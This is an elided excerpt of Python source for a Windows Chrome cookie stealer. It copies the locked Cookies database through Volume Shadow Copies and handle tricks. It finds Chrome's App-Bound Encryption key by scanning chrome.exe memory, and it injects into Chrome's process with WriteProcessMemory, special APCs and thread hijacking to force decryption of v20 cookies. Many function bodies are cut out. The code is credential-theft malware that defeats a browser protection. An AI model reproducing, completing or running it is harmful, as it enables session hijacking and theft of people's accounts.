...
def _read_cookie_rows(
    ...
    try:
        ...
        method = ""
        chrome_open = is_default and _chrome_is_open()
        if (
            is_default
            and not chrome_open
            and _try_nolock_copy(src, dest)
            and _dest_has_session_material(dest)
        ):
            method = "nolock"
        ...
        if (
            ...
            and is_default
            and not chrome_open
            and _try_live_cookie_sidecar_copy(src, dest)
        ):
            method = "wal"
        if not method and is_default and _try_cached_cookie_copy(dest):
            method = "cached"
        if not method and is_default and not chrome_open and _try_handle_dup_copy(src, dest):
        ...
        if samples:
            _cache["_v20_verify"] = samples
        sect: list[bytes] = []
        seen_sect: set[bytes] = set()
        for _h, _n, _v, enc in rows:
            blob = _cookie_blob_bytes(enc)
            if _valid_v20_sample(blob) and blob not in seen_sect:
                seen_sect.add(blob)
                sect.append(blob)
        sect.sort(key=len)
        _cache["_v20_sectura"] = sect[:8]
        _cache["_v20_prove"] = []
...
def _parse_vss_create_output(text: str) -> tuple[str, str] | None:
    ...
    if vols:
        return "", vols[-1]
    devices = _parse_vss_list_output(text)
    if devices:
        return "", devices[0]
    return None


def _decode_vss_output(stdout: Any, stderr: Any = b"") -> str:
    """vssadmin often emits UTF-16. Never pathlib-resolve this text."""
    parts: list[str] = []
    for blob in (stdout, stderr):
        ...
        elif len(raw) > 8 and raw[1:2] == b"\x00" and raw[0:1] != b"\x00":
            text = raw.decode("utf-16-le", "ignore")
        else:
            for enc in ("utf-8", "cp437", "cp1252"):
                cand = raw.decode(enc, "ignore")
                if "HarddiskVolumeShadowCopy" in cand or "Shadow Copy" in cand:
                    text = cand
                    break
            if not text:
...
def _run_vssadmin(args: list[str], timeout: int = 20) -> subprocess.CompletedProcess[bytes]:
...
def _win_volume_relpath(src: Any) -> tuple[str, str]:
    """C: + Users\\...\\Cookies. Strip \\\\?\\ so GLOBALROOT join is not a live C:\\ path."""
    text = str(src).replace("/", "\\")
    if text.startswith("\\\\?\\"):
        text = text[4:]
    if len(text) >= 2 and text[1] == ":" and text[0].isalpha():
        return text[:2].upper(), text[2:].lstrip("\\")
    drive = str(getattr(src, "drive", "") or "")
    if drive:
        letter = drive.rstrip("\\")
        ...
        raw = str(src)
        prefix = str(getattr(src, "drive", ""))
        if prefix and raw.startswith(prefix):
            return letter, raw[len(prefix) :].lstrip("\\/")
        return letter, text.lstrip("\\")
    return "", ""
...
def _win_list_shadow_devices(letter: str) -> list[str]:
    ...
    devices: list[str] = []
    try:
        run = _run_vssadmin(["list", "shadows", f"/for={letter}"], timeout=15)
...
def _win_copy_raw(src_win: str, dest: Path) -> None:
    ...
    if _looks_like_live_dos_path(src_win):
...
def _looks_like_live_dos_path(path: str) -> bool:
    text = (path or "").replace("/", "\\")
    if text.startswith("\\\\?\\") and not text.upper().startswith("\\\\?\\GLOBALROOT\\"):
        text = text[4:]
    return len(text) >= 2 and text[1] == ":" and text[0].isalpha()


def _shadow_copy_num(device: str) -> str:
    match = re.search(r"HarddiskVolumeShadowCopy(\d+)", device or "", flags=re.I)
    return match.group(1) if match else ""


def _shadow_win_paths(device: str, rel_win: str, suf: str) -> list[str]:
    num = _shadow_copy_num(device)
    if not num:
        return []
    return [
        rf"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{num}\{rel_win}{suf}",
        rf"\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy{num}\{rel_win}{suf}",
    ]


def _shadow_nt_paths(device: str, rel_win: str, suf: str) -> list[str]:
    num = _shadow_copy_num(device)
    if not num:
        return []
    return [
        rf"\Device\HarddiskVolumeShadowCopy{num}\{rel_win}{suf}",
        rf"\??\GLOBALROOT\Device\HarddiskVolumeShadowCopy{num}\{rel_win}{suf}",
    ]


def _win_copy_raw_nt(src_nt: str, dest: Path) -> None:
    """NtCreateFile on \\Device\\HarddiskVolumeShadowCopyN\\... Never a live DOS path."""
    if os.name != "nt":
        raise OSError(32, "nt copy is Windows-only")
    if "HarddiskVolumeShadowCopy" not in (src_nt or "") or _looks_like_live_dos_path(src_nt):
        raise OSError(22, "VSS copy refused live path")
    import ctypes
    from ctypes import wintypes
    ...
    buf = ctypes.create_unicode_buffer(src_nt)
    us = UNICODE_STRING()
    us.Length = len(src_nt) * 2
    us.MaximumLength = (len(src_nt) + 1) * 2
    us.Buffer = ctypes.cast(ctypes.addressof(buf), wintypes.LPWSTR)
    oa = OBJECT_ATTRIBUTES()
    oa.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
    oa.ObjectName = ctypes.pointer(us)
    ...
    status = int(
        ntdll.NtCreateFile(
            ...
            0x00000001 | 0x00000002 | 0x00000004,
            1,
            0x00000020 | 0x00000040 | 0x00004000,
            None,
            0,
        )
    ) & 0xFFFFFFFF
    if status != 0 or not handle:
        raise OSError(status or 32, "NtCreateFile shadow open failed")
    kernel32 = _kernel32()
    try:
        _read_handle_to_file(handle, dest)
    finally:
...
def _win_copy_from_shadow_device(device: str, rel: str, dest: Path) -> None:
    ...
    rel_win = _win_volume_relpath(rel)[1] or rel.replace("/", "\\").lstrip("\\")
    if rel_win.lower().endswith(":\\") or _looks_like_live_dos_path(rel_win):
        raise OSError(22, "VSS copy refused live path")
    ...
    for suf in ("", *_COOKIE_SIDECARS):
        ...
        opened = False
        for remote in _shadow_win_paths(root, rel_win, suf):
            try:
                ...
                last = exc
        if not opened:
            for remote in _shadow_nt_paths(root, rel_win, suf):
                try:
                    _win_copy_raw_nt(remote, out)
                    opened = True
                    break
                except OSError as exc:
                    last = exc
...
def _win_vss_vssadmin_copy(src: Path, dest: Path, rel: str, letter: str) -> None:
    run = _run_vssadmin(["create", "shadow", f"/for={letter}"], timeout=20)
    text = _decode_vss_output(run.stdout, run.stderr)
    parsed = _parse_vss_create_output(text)
    blob = text.lower()
    if not parsed:
    ...
    if not devices:
        ...
        raise OSError(32, "vssadmin shadow device missing")
    last: OSError | None = None
    copied = False
    try:
        for device in devices:
        ...
        if sid:
            _run_vssadmin(["delete", "shadows", f"/Shadow={sid}", "/Quiet"], timeout=20)
...
def _win_vss_copy(src: Path, dest: Path) -> None:
    """CREATE a VSS shadow, copy Cookies from GLOBALROOT, then delete the shadow."""
    letter, rel = _win_volume_relpath(src)
...
def _join_abe_hr(parts: list[str]) -> str:
    ...
    return _safe_snapshot_detail(";".join(head + tail))[:128]
...
def _v20_prove_samples(primary: bytes | None) -> list[bytes]:
    """Several landed blobs for a key prove. Sectura + short first; not longest-only."""
    out: list[bytes] = []
    seen: set[bytes] = set()
    ...
    for blob in _cache.get("_v20_sectura") or []:
        if isinstance(blob, (bytes, bytearray)):
            add(bytes(blob))
    add(primary)
    pool: list[bytes] = []
    verify = _cache.get("_v20_verify")
    if isinstance(verify, list):
        for blob in verify:
            if isinstance(blob, (bytes, bytearray)) and _valid_v20_sample(blob):
                pool.append(bytes(blob))
    pool.sort(key=len)
    for blob in pool:
        add(blob)
        if len(out) >= 8:
...
def _v20_one_ok(key: bytes | None, v20_sample: bytes | None) -> bool:
    """GCM tag success on a landed v20. Prefix may be binary SHA256. Not longest-only."""
    if not key or len(key) != 32:
        return False
    for sample in _v20_prove_samples(v20_sample):
...
def _abe_proves_cookies(key: bytes | None, v20_sample: bytes | None) -> bool:
    """GCM tag success on a landed v20. Do not require the plaintext to be printable."""
    return bool(key) and len(key) == 32 and _v20_one_ok(key, v20_sample)
...
def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, str]:
    ...
    # chrome.exe>0 is the gate — not os.name. Heap first (key already in
    # browser chrome.exe; elevation service is Stopped). Then a short APC
    # with a handshake so timeout is not blind.
    pids: list[int] = []
    try:
        pids = _chrome_pids_prioritized()
...
def _chrome_is_open() -> bool:
    """True when chrome.exe is running. Chrome-open must not touch the live Cookies path."""
    try:
        return bool(_chrome_pids())
...
def _chrome_pids_prioritized() -> list[int]:
    ...
    _cache["_chrome_browser_pids"] = list(browser)
    ordered: list[int] = []
    seen: set[int] = set()
...
def _chrome_browser_pids() -> list[int]:
    """Browser chrome.exe only (no --type=). Not network/gpu/renderer."""
    ranked = _chrome_pids_prioritized()
    cached = _cache.get("_chrome_browser_pids")
    if isinstance(cached, list) and cached:
        return [int(pid) for pid in cached]
    return ranked[:1]
...
def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
    ...
    def consider(cand: bytes | None) -> bytes | None:
        """Raw 32-byte heap vector. GCM-prove several landed v20s. Not an APC wrap key."""
        nonlocal tried, cands
        if not cand or len(cand) < 32:
            return None
        key = cand[:32]
        if key in seen or not _high_entropy32(key):
            return None
        seen.add(key)
        cands += 1
    ...
    def heap_stride(data: bytes) -> bytes | None:
        for off in range(0, len(data) - 31, _ABE_HEAP_STRIDE):
    ...
    def targeted(handle: Any, data: bytes) -> bytes | None:
...
def _bind_elevator_winapi(k32: Any, ntdll: Any) -> None:
    ...
    if hasattr(ntdll, "NtAlertThreadByThreadId"):
        ntdll.NtAlertThreadByThreadId.argtypes = [wintypes.HANDLE]
        ntdll.NtAlertThreadByThreadId.restype = ctypes.c_long
    if hasattr(k32, "GetThreadId"):
        k32.GetThreadId.argtypes = [wintypes.HANDLE]
        k32.GetThreadId.restype = wintypes.DWORD
...
def _queue_special_apc(ntdll: Any, k32: Any, thread: Any, routine: int, a1: int = 0, a2: int = 0, a3: int = 0) -> int:
    ...
    last = 0
    special = 1  # QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC / reserve handle
    if hasattr(ntdll, "NtQueueApcThreadEx2"):
        last = int(ntdll.NtQueueApcThreadEx2(thread, None, special, routine_p, a1p, a2p, a3p))
        if last >= 0:
            return 0
    if hasattr(ntdll, "NtQueueApcThreadEx"):
        last = int(ntdll.NtQueueApcThreadEx(thread, special, routine_p, a1p, a2p, a3p))
        if last >= 0:
            return 0
...
def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
    ...
    if not _cache.get("_elev_hs"):
        return None, _apc_force_miss_open(last)
    return None, last
...
def _chrome_elevator_via_exports(
    ...
    try:
        ...
        page = int(page)
        clsid_addr, iid_addr, ppv_addr = page, page + 16, page + 32
        last_err_addr, bstr_out_addr = page + 40, page + 48
        bstr_off, stack_addr, out_max = 64, 2048, 256
...
def _chrome_elevator_decrypt_once(
    ...
    try:
        ...
        if not page:
            return None, export_hr or f"alloc:err={_win32_err() or 8}"
        page = int(page)
        stub_off = 0x100
        bstr_off = 0x200
        out_off = 0x200 + 4 + len(payload) + 4
        if out_off + out_max > page_size:
            return None, export_hr or "alloc:err=size"
        ...
        block[_ELEV_HANDSHAKE_OFF + 4] = _ELEV_HANDSHAKE  # CFG memmove src
        ...
        if not k32.WriteProcessMemory(handle, page, src, page_size, ctypes.byref(wrote)):
            return None, export_hr or f"alloc:err={_win32_err() or 'wpm'}"
        # Keep RW. PAGE_EXECUTE_READ made a memmove handshake a write AV.
        copy_fn = 0
        for dll, name in (
            ("ntdll.dll", "memmove"),
            ("ntdll.dll", "memcpy"),
            ...
            copy_fn = _remote_export_addr(k32, handle, dll, name)
            if copy_fn:
                break
        ...
        def handshake_set() -> bool:
            peek = (ctypes.c_char * 1)()
            if k32.ReadProcessMemory(
                handle, dest, peek, 1, ctypes.byref(wrote)
            ) and peek[0] == _ELEV_HANDSHAKE:
                _cache["_elev_hs"] = True
                return True
            return False

        def wake(th: Any) -> bool:
            _alert_existing_thread(ntdll, k32, th, int(nt_test_alert or 0))
            if handshake_set():
                return True
            if hasattr(ntdll, "NtAlertThreadByThreadId") and hasattr(k32, "GetThreadId"):
                tid = int(k32.GetThreadId(th) or 0)
                if tid:
                    try:
                        ntdll.NtAlertThreadByThreadId(tid)
                    except (OSError, ValueError, TypeError):
                        pass
            if handshake_set():
                return True
            if sleepex:
                _hijack_existing_thread(
                    k32, handle, th, int(sleepex), 0, 1, 0, 0, rsp, b"", 0.08
                )
                if handshake_set():
                    return True
            if nt_test_alert:
                _hijack_existing_thread(
                    k32, handle, th, int(nt_test_alert), 0, 0, 0, 0, rsp, b"", 0.08
                )
            return handshake_set()

        # CFG-valid ntdll memmove writes the handshake. VirtualAlloc stubs die.
        start = copy_fn or (page + hs_off)
        for th in threads:
            if time.monotonic() >= deadline:
                break
            a1, a2, a3 = (dest, src, 1) if copy_fn else (page, 0, 0)
            last_status = _queue_special_apc(ntdll, k32, th, start, a1, a2, a3)
            if wake(th):
                break
            _hijack_existing_thread(
                k32, handle, th, start, a1, a2, a3, 0, rsp, b"", 0.12
            )
            wait_until = time.monotonic() + 0.08
        ...
        ran = handshake_set()
        if not ran:
            return None, _apc_force_miss_open(last_status if last_status else "queued")
        # Handshake set — DecryptData via ole32 exports only. Do not wait on the service.
        pt, via_hr = _chrome_elevator_via_exports(
            pid, payload, clsid_s, iid_s, clsctx, coinit, flag, 0.4
        )
        if pt:
            return pt, via_hr
        if (via_hr or "").startswith(("apc:hr=", "elev:len=", "apc:key")):
            return None, f"apc:ran;{via_hr}"
        return None, "apc:ran"
    except (AttributeError, OSError, ValueError, TypeError, OverflowError) as exc:
...
def _v20_cookie_text(plain: bytes) -> str:
    """v20 cookie plaintext: 32-byte metadata (often SHA256), then the cookie."""
    if not plain:
        return ""
    chunks = []
    if len(plain) > 32:
        chunks.append(plain[32:].split(b"\x00", 1)[0])
    chunks.append(plain.split(b"\x00", 1)[0])
    for chunk in chunks:
        if not chunk:
            continue
        try:
...
def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
    """AES-256-GCM, empty AAD, v20|12-nonce|ct|16-tag. BCrypt first on Windows."""
    if len(payload) < 12 + 16 or not key or len(key) not in {16, 24, 32}:
        return b""
    if os.name == "nt":
        got = _aes_gcm_decrypt_bcrypt(payload, key)
        if got:
            return got
    nonce = payload[:12]
    ...
    try:
        ...
        try:
            ...
            return _aes_gcm_decrypt_stdlib(payload, key)
